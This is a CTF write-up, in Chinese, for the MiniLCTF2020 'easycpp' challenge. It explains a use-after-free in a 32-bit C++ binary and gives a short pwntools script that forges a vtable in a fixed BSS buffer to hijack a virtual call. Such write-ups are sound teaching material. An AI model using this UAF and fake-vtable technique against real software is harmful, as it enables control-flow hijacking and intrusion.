# MiniLCTF2020 - easycpp

## 题目简述

32 位 C++ 程序先在堆上创建对象 `B`，随后释放它，却继续通过旧指针调用虚函数。其间 `strdup(buf)` 会申请同尺寸堆块并写入攻击者内容，形成典型 UAF 与伪造 vtable 利用。

## 解题过程

参赛记录恢复的主逻辑为：

```cpp
B *obj = (B *)operator new(4);
B::B(obj);
operator delete(obj);
fgets(buf, 1024, stdin);
strdup(buf);
obj->vptr[0](obj);
```

原对象只有一个 4 字节 vptr，释放后的 fastbin 小块会被 `strdup()` 重新取回。输入同时保留在固定 BSS 缓冲区 `0x804a0c0`，因此可以让重用堆块的第一个字写成 `0x804a0c4`，把那里作为伪 vtable；BSS 的第二个字再放目标函数地址 `0x80487bb`：

```python
from pwn import *

context.arch = 'i386'
io = process('./easycpp')

buf = 0x804a0c0
target = 0x80487bb
payload = p32(buf + 4) + p32(target)

io.sendline(payload)
io.interactive()
```

虚调用解引用过程为：

```text
stale obj -> [buf + 4] -> target
```

当前官方仓库没有保留 `easycpp` 二进制、libc 或容器，所以上述地址只能由多份参赛反编译与 exploit 记录交叉确认，无法在现存工件上重新运行；正文不补造缺失的远程回包。

## 方法总结

C++ UAF 的常见终点是伪造 vptr/vtable。要同时确认旧对象大小、后续分配是否能复用同一 size class，以及伪表所在内存是否固定可读。利用脚本中的绝对地址强依赖无 PIE 的原始二进制，换附件后必须重定位。
